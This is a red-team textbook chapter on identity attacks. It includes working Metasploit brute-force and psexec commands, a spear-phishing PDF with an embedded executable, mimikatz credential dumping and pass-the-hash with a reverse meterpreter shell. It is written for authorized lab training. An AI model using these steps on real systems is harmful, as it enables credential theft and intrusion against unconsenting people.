<p>In the last chapter, you learned different techniques you can use to compromise a system. However, in the current threat landscape, compromised credentials are now being used to compromise systems and networks further. According to the 2016 <em>Data Breach Investigation Report</em> from Verizon, 63% of confirmed data breaches happened due to weak, default, or stolen passwords, which was driven by the number of attacks targeting the user's credentials. This threat landscape pushes enterprises to develop new strategies to enhance the overall security aspect of a user's identity.</p>
<p>In this chapter, we're going to be covering the following topics:</p>
<ul>
<li>Identity is the new perimeter</li>
<li>Strategies to compromise a user's identity</li>
<li>Hacking a user's identity</li>
</ul>

                </header>
            
            <article>
                
<p>As was briefly explained in <a href="3a4a477a-d673-4f0d-bbe8-f8e2a1289d38.xhtml" target="_blank"><span class="ChapterrefPACKT">Chapter 1</span></a>, <em>Security Posture</em> the protection surrounding the identity must be enhanced, and that's why the industry is in common agreement that identity is the new perimeter. This occurs because every time a new credential is created, the majority of the time this credential is composed only of a username and password. While multifactor authentication is gaining popularity, it is still not the default method used to authenticate users. On top of that, there are lots of legacy systems that rely purely on usernames and passwords in order to work properly.</p>
<p>Credential theft is a growing trend in different scenarios, such as:</p>
<ul>
<li><strong>Enterprise users</strong>: Hackers that are trying to gain access to a corporate network and want to infiltrate without making any noise. One of the best ways to do that is by using valid credentials to authenticate, and be part of, the network.</li>
<li><strong>Home users</strong>: Many banking Trojans, such as the Dridex family, are still actively in use because they target a user's bank credentials, and that's where money is.</li>
</ul>
<p>The problem with this current identity threat landscape is that home users are also corporate users, and are bringing their own devices to consume corporate data. Now you have a scenario where a user's identity for his personal application, resides in the same device that has his corporate credentials in use to access corporate-related data.</p>
<p>The problem with users handling multiple credentials for different tasks is that users might utilize the same password for these different services.</p>
<p>For example, a user using the same password for his cloud-based email service and corporate domain credentials will help hackers because they only need to identify the username, since once one password is cracked, all others will be the same. Nowadays, browsers are being used as the main platform for users to consume applications, and browser's vulnerabilities can be exploited to steal a user's credentials. Such a scenario happened in May 2017, when a vulnerability was discovered in Google Chrome.</p>
<p>Although the issue seems to be related to end users and enterprises, the reality is that no one is safe, and anyone can be targeted, even someone in politics. In an attack revealed in June 2017 by <em>The Times</em>, it was reported that the email addresses and passwords of Justine Greening (the education secretary) and Greg Clark (the business secretary) of the UK government, were among the tens of thousands of government officials' credentials that were stolen, and later sold on the darknet. The problem with stolen credentials is not only using those credentials to access privileged information, but also being used to start a targeted spear-phishing campaign. The following diagram shows an example of how stolen credentials can be used:</p>
<div class="CDPAlignCenter CDPAlign"><img height="467" width="613" src="assets/3ab621f4-4488-4aa2-a832-1afe729cae82.png"/></div>
<p>An interesting part of the workflow shown in the previous diagram, is that the hacker doesn't really need to prepare the entire infrastructure to launch the attack. Nowadays, they can just rent bots that belong to someone else. This strategy was used in 2016 during the IoT DDoS attack, and according to ZingBox, <em>"</em>the price for 50,000 bots with attack duration of 3600 secs (1 hour) and 5-10-minute cooldown time is approximately $3,000 to $4,000 per 2 weeks."</p>
<p>As cloud computing grows, the amount of <strong>Software as a Service</strong> (<strong>SaaS</strong>) apps that use the cloud provider's identity management system also grows, which means, more Google accounts, more Microsoft Azure accounts, and so on. These cloud vendors usually offer two-factor authentication, to add an extra layer of protection. However, the weakest link is still the user, which means this is not a bulletproof system. While it is correct to say that two-factor authentication enhances the security of the authentication process, it has been proved that it is possible to hack into this process.</p>
<p>One famous example of broken two-factor authentication involved the activist DeRay Mckesson. Hackers called Verizon, and using social engineering skills, they pretended they were Mckesson, and convinced them that his phone had a problem. They convinced the Verizon technician to reset his SIM card. They activated the new SIM with the phone in their possession, and when the text message came the hackers were able to get the code and it was game over.</p>

<p>As you can see, identity plays a big role in how hackers gain access to the system and execute their mission, which in most cases is to access privileged data or hijack that data. The <strong>Red Team</strong> must be aware of all these risks, and how to exploit them during the attack exercise. For this reason, it is important to establish a plan of attack before we start acting. This plan should take into consideration the current threat landscape, which includes three stages:</p>
<div class="CDPAlignCenter CDPAlign"><img height="345" width="420" src="assets/8441f5cf-c690-4430-8596-921e5c3a058c.png"/></div>
<p>During <strong>Stage 1</strong>, the <strong>Red Team</strong> will study the different adversaries that the company has. In other words, who can potentially attack us? The first step to answer this question is to perform a self-assessment and understand what type of information the company has, and who would benefit from obtaining it. You might not be able to map all adversaries, but at least you will be able to create a basic adversary profile, and based on that you can move on to the next stage.</p>
<p>In <strong>Stage 2</strong>, the <strong>Red Team</strong> will research the most common attacks launched by these adversaries. Remember, that many of these groups have a pattern. While it is not fully guaranteed that they will use the same technique, they might use a similar workflow. By understanding the category of the attack, and how they are created, you can try to emulate something similar during your attack exercise.</p>
<p>The last stage again starts with research, but this time to understand how these attacks are executed, the order in which they were executed, and so on.</p>
<p>The goal here is to learn from this stage, and apply them to production during the exercise. What the Red Team is doing here is just trying to be accurate with reality. It doesn't really help if the Red Team starts an attack exercise without a purpose and without tangible evidence that other hacking groups might do the same.</p>
<p>Another important aspect of this planning phase is to understand that attackers will not stop if they fail to infiltrate on the first attempt, they are likely to attack again, but this time using different techniques, until they are able to break in. The Red Team must operate with this hacker mindset, and continue their mission despite initial failure.</p>
<p>The Red Team needs to define some strategies to gain access to user credentials, and continue their attack within the network until the mission is accomplished. In most cases the mission is to gain access to privileged information. Therefore, before you start the exercise it is important to be clear on this mission. Efforts must be synchronized and organized otherwise you increase the likelihood of being caught, and the Blue Team wins.</p>
<p>It is important to keep in mind that this is a suggestion of how to create attack exercises. Each company should perform a self-assessment, and based on the result of this assessment, create exercises that are relevant to their reality.</p>

<p>Part of the planning process is to gain access to a user's credentials and understand how to get access to the internal network from outside (external-internet). One of the most successful attacks is still the old phishing email. The reason this attack is so successful is because it uses social engineering techniques to entice the end user to perform a specific action. Before creating a crafted email with a malicious dropper, it is recommended to perform recon using social media to try to understand the target user's behavior outside of work. Try to identify things such as:</p>
<ul>
<li>Hobbies</li>
<li>Places that he/she usually checks into</li>
<li>Preferred food</li>
<li>Sites that are commonly visited</li>
</ul>
<p>The intent here is to be able to create a crafted email that it is relevant to one of those subjects. By elaborating an email that has relevance to the user's daily activities you are increasing the likelihood that this user will read the email, and take the desired action.</p>

                    <h1 class="header-title">Harvesting credentials</h1>
                </header>
            
            <article>
                
<p>If during the recon process you have already identified unpatched vulnerabilities that could lead to credential exploitation, this could be the easiest path to take.</p>
<p>For example, if the target computer is vulnerable to CVE-2017-8563 (allows an elevation of privilege vulnerability due to Kerberos falling back to NTLM Authentication Protocol), it will be easier to perform a privilege escalation, and potentially gain access to a local administrator account. Most attackers will perform a lateral movement within the network, trying to obtain access to an account that has privileged access to the system, therefore the same approach should be used by the Red Team.</p>
<p>One attack that gained popularity once Hernan Ochoa published the Pass-The-Hash Toolkit, is the pass-the-hash attack. To understand how this attack works, you need to understand that a password has a hash, and this hash is a direct, one-way, mathematical derivation of the password itself, which only changes when the user changes the password. Depending on how the authentication is performed, it is possible to present the password hash instead of a plaintext password as proof of the user's identity to the operating system. Once the attacker obtains this hash, he can use it to assume the identity of the user (victim), and continue his attack within the network.</p>
<div class="CDPAlignCenter CDPAlign"><img height="526" width="815" src="assets/4bf3b813-76dc-4c57-aac9-025cfd580e7a.png"/></div>
<p>Lateral movement is very useful for compromising more machines within the environment, and it can also be used to hop between systems to harvest more valuable information.</p>
<div class="packt_infobox">Remember that the mission is to obtain sensitive data, and sometimes you don't need to move to the server in order to obtain this data.</div>
<p>In the previous image, there was a lateral movement from Alex to Sandra's computer, and a privilege escalation from Sandra to the web server. This can be done because within Sandra's workstation there was another user that had administrative access to this server.</p>
<p>It is important to emphasize that the account that was harvested locally by the attacker cannot be used in further attacks. Using the previous diagram as an example, if a domain admin account was never used to authenticate on Alex and Sandra's workstations, this account will not be available to an attacker that has compromised these workstations.</p>
<p>As mentioned previously, to execute the pass the hash attack <span>successful</span>, you must obtain access to an account with administrative privileges on the Windows system. Once the Red Team gains access to the local computer, they can try to steal the hash from the following locations:</p>
<ul>
<li>The <strong>Security Accounts Manager</strong> (<strong>SAM</strong>) database</li>
<li>The <strong>Local Security Authority Subsystem</strong> (<strong>LSASS</strong>) process memory</li>
<li>The <strong>Domain Active Directory Database</strong> (domain controllers only)</li>
<li>The <strong>Credential Manager</strong> (<strong>CredMan</strong>) store</li>
<li>The <strong>Local Security Authority</strong> (<strong>LSA</strong>) secrets in the registry</li>
</ul>
<p>In the next section, you will learn how to perform these actions in a lab environment prior to executing your attack exercise.</p>

<p>Now that you know the strategies, it is time for some hands-on activity. However, before that, here are some important considerations:</p>
<ol>
<li>Do not perform these steps in a production environment</li>
<li>Create an isolated lab to test any type of Red Team operation</li>
<li>Once all tests are done and validated, make sure you build your own plan to reproduce these tasks in a production environment as part of the Red Team attack exercise</li>
<li>Before performing the attack exercise, make sure you have the agreement of your manager, and that the entire command chain is aware of this exercise</li>
</ol>
<div class="packt_infobox">The tests that follow could be applied in an on-premises environment, as well as in a VM located in the cloud (IaaS).</div>

                    <h1 class="header-title">Brute force</h1>
                </header>
            
            <article>
                
<p>The first attack exercise might be the oldest one, but it is still valid for testing two aspects of your defense controls:</p>
<ul>
<li><strong>The accuracy of your monitoring system</strong>: Since brute force attacks may cause noise, it is expected that your defense security controls can catch the activity while it is happening. If it doesn't catch it, you have a serious problem in your defense strategy.</li>
<li><strong>How strong is your password policy?</strong>: If your password policy is weak, chances are that this attack will be able to obtain many credentials. If it does, you have another serious problem.</li>
</ul>
<p>For this exercise, there is an assumption that the attacker is already part of the network and it could be a case of an internal threat trying to compromise a user's credentials for nefarious reasons.</p>
<p>On a Linux computer running Kali, open the <span class="packt_screen">Applications</span> menu, click <span class="packt_screen">Exploitation Tools</span>, and select <span class="packt_screen">metasploit-framework</span>:</p>
<div class="CDPAlignCenter CDPAlign"><img height="347" width="402" src="assets/f2052b54-0a16-4862-b3c9-26937910f2d1.png"/></div>
<p>When the Metasploit console opens, type <kbd>use exploit/windows/smb/psexec</kbd>, and your prompt will change as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img height="32" width="272" src="assets/bb7044f2-83cd-4582-83a3-0dda24ca3ba7.png"/></div>
<p>Now, switch prompt again since you will leverage the <span class="packt_screen">SMB Login Scanner</span>. For that, type <kbd>use auxiliary/scanner/smb/smb_login</kbd>. Configure the remote host using the command <kbd>set rhosts &lt;target&gt;</kbd>, configure the user that you want to attack with the command set <kbd>smbuser &lt;username&gt;</kbd>, and make sure to turn verbose mode on by using the command <kbd>set verbose true</kbd>.</p>
<p>Once all this is done, you can follow the steps from the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img height="69" width="412" src="assets/58bcce10-e7da-433a-b78d-5a735b092e97.png"/></div>
<p>As you can see, the command sequence is simple. The power of the attack relies on the password file. If this file contains a lot of combinations you increase the likelihood of success, but it will also take more time and potentially trigger alerts in the monitoring system due to the amount of SMB traffic. If, for some reason, it does raise alerts, as a member of the Red Team you should back off, and try a different approach.</p>

<p>The next exercise starts from outside. In other words, the attacker is coming from the internet, and gaining access to the system in order to perform the attack. One approach to that is by driving the user's activity to a malicious site in order to obtain a user's identity.</p>
<p>Another method that is commonly used is sending a phishing email that will install a piece of malware in the local computer. Since this is one of the most effective methods, we will use this one for this example. To prepare this crafted email, we will use the <strong>Social Engineering Toolkit</strong> (<strong>SET</strong>) which comes with Kali.</p>
<p>On the Linux computer running Kali, open the <span class="packt_screen">Applications</span> menu, click <span class="packt_screen">Exploitation Tools</span>, and select <span class="packt_screen">Social Engineering Toolkit</span>:</p>
<div class="CDPAlignCenter CDPAlign"><img height="301" width="446" src="assets/0bff682c-7a22-4f7b-802a-416e58488309.png"/></div>
<p>On this initial screen you have six options to select from. Since the intent is to create a crafted email that will be used for a socially engineered attack, select option 1 and you will see the following screen:</p>
<div class="CDPAlignCenter CDPAlign"><img height="266" width="375" src="assets/99128da9-0d01-4387-8bd6-4fdd4cd2e459.png"/></div>
<p>Select the first option in this screen, which will allow you to start creating a crafted email to be used in your spear-phishing attack:</p>
<div class="CDPAlignCenter CDPAlign"><img height="242" width="407" src="assets/6b01d3e6-03ab-4ee8-b21d-6c3d34fa0ee9.png"/></div>
<p>As member of the Red Team, you probably don't want to use the first option (mass email attack), since you have a very specific target obtained during your recon process via social media.</p>
<p>For this reason, the right choices at this point are either the second (payload) or the third (template). For the purpose of this example, you will use the second option:</p>
<div class="CDPAlignCenter CDPAlign"><img height="240" width="349" src="assets/24a08d4c-49f2-4b7d-aeaf-7147aef8ac0c.png"/></div>
<p>Let's say that during your recon process you noticed that the user you are targeting uses a lot of PDF files, which makes him a very good candidate to open an email that has a PDF attached. In this case, select option 16 (Adobe PDF Embedded EXE Social Engineering), and you will see the following screen:</p>
<div class="CDPAlignCenter CDPAlign"><img height="57" width="455" src="assets/c865d084-3a8a-44f2-94de-0e106094c664.png"/></div>
<p>The option that you choose here depends on having a PDF or not. If you, as a member of the Red Team, have a crafted PDF, select option 1, but for the purpose of this example use option 2 to use a built-in blank PDF for this attack. Once you select this option the following screen appears:</p>
<div class="CDPAlignCenter CDPAlign"><img height="109" width="519" src="assets/c78c5028-b8e3-47cf-8399-a829c50730a4.png"/></div>
<p class="mce-root CDPAlignLeft CDPAlign">Select option 2, and follow the interactive prompt that appears asking about your local IP address to be used as <kbd>LHOST</kbd>, and the port to connect back with this host:</p>
<div class="CDPAlignCenter CDPAlign"><img height="238" width="411" src="assets/e04e0b89-b275-4a7e-9469-180733725076.png"/></div>
<p>Now you want to be cool, and select the second option to customize the file name. In this case the file name will be <kbd>financialreport.pdf</kbd>. Once you type the new name, the available options are shown as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img height="225" width="435" src="assets/6606457e-bf51-4cd0-96dc-ece408c1a8d9.png"/></div>
<p>Since this is a specific-target attack, and you know the email addresses of the victim, select the first option:</p>
<div class="CDPAlignCenter CDPAlign"><img height="162" width="285" src="assets/731a3e83-d610-47ac-bdd9-302638866e9d.png"/></div>
<p>In this case, we will select the status report, and after selecting this option you have to provide the target's email and the sender's email. Notice that for this case, we are using the second option, which is a Gmail account:</p>
<div class="CDPAlignCenter CDPAlign"><img height="134" width="393" src="assets/65cf2a1e-9be7-4b70-b203-8e7c25042c73.png"/></div>
<p>At this point the file <kbd>financialreport.pdf</kbd> is already saved in the local system. You can use the command <kbd>ls</kbd> to view the location of this file as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img height="139" width="417" src="assets/7f7989b0-aa91-4510-9a18-8de9d1d3ea5a.png"/></div>
<p>This 60 KB PDF file will be enough for you to gain access to the user's command prompt and from there use <kbd>mimikatz</kbd> to compromise a user's credentials as you will see in the next section.</p>
<p>If you want to evaluate the content of this PDF, you can use the <span class="packt_screen">PDF Examiner</span> from <a href="https://www.malwaretracker.com/pdfsearch.php">https://www.malwaretracker.com/pdfsearch.php</a>. Upload the PDF file to this site, click submit, and check the results. The core report should look like this:</p>
<div class="CDPAlignCenter CDPAlign"><img height="495" width="452" src="assets/0a1ada22-bf56-4453-b2a9-77e056fb2da3.png"/></div>
<p>Notice that there is an execution of an <kbd>.exe</kbd> file. If you click on the hyperlink for this line, you will see that this executable is <kbd>cmd.exe</kbd>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img height="476" width="475" src="assets/84ff8e18-1405-4842-9902-72e2ff0ceef3.png"/></div>
<p>The last decoding piece of this report shows the action <span class="packt_screen">Launch</span> for the executable <kbd>cmd.exe</kbd>.</p>

<p>At this point you have access to <kbd>cmd.exe</kbd>, and from there you can launch PowerShell using the command <kbd>start powershell -NoExit</kbd>. The reason you want to launch PowerShell is because you want to download <kbd>mimikatz</kbd> from GitHub.</p>
<p>To do that, run the following command:</p>
<pre><strong>Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20170813/mimikatz_trunk.zip" -OutFile "C:tempmimikatz_trunk.zip"</strong>  </pre>
<p>Also, make sure to download the PsExec tool from Sysinternals, since you will need it later. To do that, use the following command from the same PowerShell console:</p>
<pre><strong>Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:tempPSTools.zip"</strong>  </pre>
<p>In the PowerShell console, use the command <kbd>expand-archive -path</kbd> to extract the content from <kbd>mimikatz_trunk.zip</kbd>. Now you can launch <kbd>mimikatz</kbd>. One of the first steps is to verify if the user running command prompt has administrative privileges. If they do, you will see the following results when you run the <kbd>privilege::debug</kbd> command:</p>
<div class="CDPAlignCenter CDPAlign"><img height="237" width="467" src="assets/c5b61ae2-2925-4b07-9edc-4f9a6ccb6802.png"/></div>
<p>The next step is to dump all active users, services, and their associated NTLM/SHA1 hashes. This is a very important step, because it will give you an idea of the number of users that you can try to compromise to continue your mission.</p>
<p>To do that, use the command <kbd>sekurlsa::logonpasswords</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img height="249" width="490" src="assets/ff26de25-f529-4053-8736-c0078812629a.png"/></div>
<p>If the target computer is running any Windows version up to Windows 7, you may see the actual password in clear text. The reason we say "may," is because if the target computer has the MS16-014 update installed, Windows will forcibly clear leaked logon session credentials after 30 seconds.</p>
<p>Moving forward you can perform the attack, since you now have had the hash. The attack can be performed on a Windows system using mimikatz and the <kbd>psexec</kbd> tool (the one that you downloaded previously). For this scenario, we are going to use the following command as an example:</p>
<pre><strong>sekurlsa::pth /user:yuri /domain:wdw7 /ntlm:4dbe35c3378750321e3f61945fa8c92a /run:".psexec \yuri -h cmd.exe"</strong>  </pre>
<p>The command prompt will open using the context of that particular user. If that user has administrative privileges, it's game over. The execution of the attack can also be done from Metasploit, on a computer running Kali. The sequence of commands is shown as follows:</p>
<pre><strong>&gt; use exploit/windows/smb/psexec</strong>
<strong>&gt; set payload windows/meterpreter/reverse_tcp</strong>
<strong>&gt; set LHOST 192.168.1.99</strong>
<strong>&gt; set LPORT 4445</strong>
<strong>&gt; set RHOST 192.168.1.15</strong>
<strong>&gt; set SMBUser Yuri</strong>
<strong>&gt; set SMBPass 4dbe35c3378750321e3f61945fa8c92a</strong>  </pre>
<p>Once these steps are done, run the <kbd>exploit</kbd> command and see the results:</p>
<div class="packt_figure CDPAlignCenter CDPAlign"><img height="67" width="501" src="assets/23bde0ee-2f8d-4989-bcf2-c98197028101.png"/></div>
<p>Since this is only a Red Team exercise, the intent here is to prove that the system is vulnerable to this type of attack. Notice that we didn't compromise any data, only showed how vulnerable the entire identity protection really is.</p>

<p>While it is safe to say that a lot of damage can be done using the three approaches that were previously mentioned, it also safe to say that there are still more ways to hack identities. The Red Team can use the cloud infrastructure as the target for the attack. The Nimbostratus tool by Andres Riancho is a great resource for exploiting Amazon Cloud infrastructure.</p>
<p>As a member of the Red Team, you may also need to pursue attacks against the hypervisor (VMWare or Hyper-V). For this type of attack, you can use PowerMemory (<a href="https://github.com/giMini/PowerMemory/">https://github.com/giMini/PowerMemory/</a>) to exploit the VM's passwords.</p>

<p>In this chapter, you learned about the importance of identity for the overall security posture of an organization. You learned about the different strategies to compromise a user's identity that can be used by the Red Team. By learning more about the current threat landscape, the potential adversaries, and how they act, you can create a more accurate attack exercise to test the defense security controls. You learned about brute force attacks, social engineering using SET from Kali, pass-the-hash, and how these attacks can be used to perform lateral movement in order to accomplish the attack's mission.</p>
<p>In the next chapter, you will learn more about lateral movement, how the Red Team will use the hacker's mindset to continue their mission of mapping the network, and avoiding alerts.</p>
